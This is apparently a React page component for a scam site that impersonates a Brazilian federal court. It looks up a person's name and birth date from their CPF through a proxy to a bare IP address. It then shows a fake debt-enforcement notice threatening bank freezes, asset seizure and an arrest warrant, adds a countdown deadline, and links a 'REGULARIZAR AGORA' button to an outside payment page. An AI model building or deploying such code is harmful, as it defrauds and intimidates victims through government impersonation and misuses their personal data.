// src/pages/Processo.tsx
import { useEffect, useMemo, useState } from "react";
import { useLocation } from "react-router-dom";
import logo from "../assets/logo.png"; // use se tiver o arquivo local

type Dados = { cpf: string; nome: string; sexo?: string; nascimento?: string };

const API_URL =
  import.meta.env.VITE_CPF_API_URL ??
  "https://proxy-1mu0.onrender.com/http://185.101.104.231:3001/search";

// util: máscara de CPF
function maskCpf(v: string) {
  const n = v.replace(/\D/g, "").slice(0, 11);
  return n.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
}

// util: data dd/mm/aaaa (se vier “aaaa-mm-dd” ou “dd/mm/aaaa”)
function formatDateBR(d?: string) {
  if (!d) return "—";
  if (/^\d{4}-\d{2}-\d{2}$/.test(d)) {
    const [y, m, day] = d.split("-");
    return `${day}/${m}/${y}`;
  }
  return d;
}

// número do processo (demo) — troque pelo real se sua API devolver
function gerarNumeroProcesso(cpf: string) {
  const d = cpf.replace(/\D/g, "");
  const base = (d || "0000000").slice(0, 7).padEnd(7, "0");
  return `PROCESSO Nº ${base}.89.2024.8.26.0000`;
}

// deadline com contagem (ex.: agora + 4h)
function useDeadline(hoursFromNow = 4) {
  const [now, setNow] = useState(() => new Date());
  useEffect(() => {
    const id = setInterval(() => setNow(new Date()), 1000);
    return () => clearInterval(id);
  }, []);
  const limit = useMemo(() => {
    const d = new Date();
    d.setHours(d.getHours() + hoursFromNow);
    return d;
  }, [hoursFromNow]);
  const leftMs = Math.max(0, limit.getTime() - now.getTime());
  const hh = String(Math.floor(leftMs / 3_600_000)).padStart(2, "0");
  const mm = String(Math.floor((leftMs % 3_600_000) / 60_000)).padStart(2, "0");
  const ss = String(Math.floor((leftMs % 60_000) / 1000)).padStart(2, "0");
  const hoje = new Date().toLocaleDateString("pt-BR");
  const horaLimite = `${String(limit.getHours()).padStart(2, "0")}:${String(limit.getMinutes()).padStart(2, "0")}:${String(limit.getSeconds()).padStart(2, "0")}`;
  return { hoje, horaLimite, restStr: `${hh}:${mm}:${ss}` };
}

export default function Processo() {
  const { search } = useLocation();
  const cpf = useMemo(() => new URLSearchParams(search).get("cpf") ?? "", [search]);

  const [dados, setDados] = useState<Dados | null>(null);
  const [erro, setErro] = useState<string | null>(null);
  const { hoje, horaLimite, restStr } = useDeadline(4);

  useEffect(() => {
    if (!cpf || cpf.replace(/\D/g, "").length !== 11) {
      setErro("CPF ausente ou inválido.");
      return;
    }
    (async () => {
      try {
        const res = await fetch(`${API_URL}?cpf=${cpf}`);
        if (!res.ok) throw new Error("Erro ao buscar CPF");
        const text = await res.text();
        const [cpfRetorno, nome, sexo, nascimento] = text.replace("%", "").split("|");
        setDados({ cpf: cpfRetorno, nome, sexo, nascimento });
      } catch {
        setErro("Não foi possível obter o resultado.");
      }
    })();
  }, [cpf]);

  return (
    <div className="min-h-screen bg-gray-50 text-gray-900">
      <div className="mx-auto max-w-3xl px-4 py-10">
        <div className="rounded-2xl bg-white p-6 sm:p-10 shadow-xl ring-1 ring-black/5">
          {/* topo */}
          <div className="flex flex-col items-center">
            <img
            src={logo}

              alt=""
              className="mb-4 h-20 w-30"
            />
            <h1 className="text-center text-[20px] font-semibold tracking-wide">
              SISTEMA JUDICIAL FEDERAL
            </h1>
            <p className="mt-1 text-center text-sm text-gray-600">
              {gerarNumeroProcesso(cpf)}
            </p>
          </div>

          {/* meta */}
          <div className="mt-8 grid grid-cols-1 gap-3 text-[15px] sm:grid-cols-2">
            <div><span className="font-semibold">Data:</span> {hoje}</div>
            <div><span className="font-semibold">Autor:</span> Sistema Judicial Federal</div>
            <div><span className="font-semibold">Natureza:</span> Cobrança de Dívida Ativa</div>
            <div><span className="font-semibold">Situação:</span> Em Execução Fiscal</div>
          </div>

          {/* bloco dados pessoa */}
          <div className="mt-6 rounded-xl bg-gray-50 p-4 text-[15px]">
            <div><span className="font-semibold">Nome:</span> {dados?.nome || "—"}</div>
            <div><span className="font-semibold">CPF:</span> {dados?.cpf ? maskCpf(dados.cpf) : "—"}</div>
            <div><span className="font-semibold">Data de Nascimento:</span> {formatDateBR(dados?.nascimento)}</div>
          </div>

          {/* notificação vermelha */}
          <div className="mt-6 rounded-xl border border-red-200 bg-red-50 p-5 text-[15px] leading-relaxed">
            <h2 className="mb-3 font-semibold text-red-700">NOTIFICAÇÃO DE EXECUÇÃO JUDICIAL</h2>

            <p className="mb-2">
              <span className="font-semibold">I –</span> A dívida encontra-se em <span className="font-semibold text-red-700">execução fiscal</span> no SAPJ, conforme Lei nº 6.830/80.
            </p>

            <p className="mb-2">
              <span className="font-semibold">II –</span> O não pagamento implicará em:
            </p>
            <ul className="mb-3 list-disc pl-6">
              <li className="font-semibold text-red-700">Bloqueio de contas bancárias</li>
              <li className="font-semibold text-red-700">Penhora de bens móveis e imóveis</li>
              <li className="font-semibold text-red-700">Suspensão de CPF para crédito</li>
              <li className="font-semibold text-red-700">Expedição de mandado de prisão preventiva</li>
            </ul>

            <p className="mb-1"><span className="font-semibold">III –</span> O réu deverá regularizar imediatamente, evitando multa diária e responsabilização criminal.</p>
            <p className="mb-1"><span className="font-semibold">IV –</span> O processo tramita em segredo de justiça. A omissão configura crime de desobediência.</p>
            <p className="mb-1"><span className="font-semibold">V –</span> Os autos serão remetidos ao Ministério Público para representação penal.</p>
            <p className="mb-1"><span className="font-semibold">VI –</span> A dívida está registrada na União e sua quitação é <span className="font-semibold">obrigatória</span>.</p>
            <p className="mb-1"><span className="font-semibold">VII –</span> A inadimplência pode gerar restrição no Serasa, SPC e impedir emissão de certidões negativas.</p>
            <p className="mb-1"><span className="font-semibold">VIII –</span> A ausência de quitação pode motivar busca e apreensão.</p>
            <p className="mb-1"><span className="font-semibold">IX –</span> A reincidência será agravante em qualquer instância judicial.</p>
            <p className="mb-2"><span className="font-semibold">X –</span> O não cumprimento poderá ser interpretado como tentativa de ocultação patrimonial.</p>

            <p className="mt-2 font-semibold text-red-700">
              Prazo final para regularização: até hoje às {horaLimite} ({restStr})
            </p>
          </div>

         {/* CTA */}
<div className="mt-8 flex justify-center">
  <button
    className="rounded-lg bg-[#c01610] px-8 py-3 text-sm font-semibold text-white shadow hover:bg-[#a9130e] focus:outline-none focus:ring-2 focus:ring-red-400"
    onClick={() => {
      window.location.href = "https://pay.pagetax.site/z0qn35qEJPN398m";
    }}
  >
    REGULARIZAR AGORA
  </button>
</div>

          {/* rodapé */}
          <p className="mt-8 text-center text-xs text-gray-500">
            © 2025 Ministério da Justiça - Governo Federal
          </p>
        </div>

        {erro && (
          <div className="mt-4 rounded-lg border border-red-200 bg-red-50 px-4 py-3 text-sm text-red-700">
            {erro}
          </div>
        )}
      </div>
    </div>
  );
}
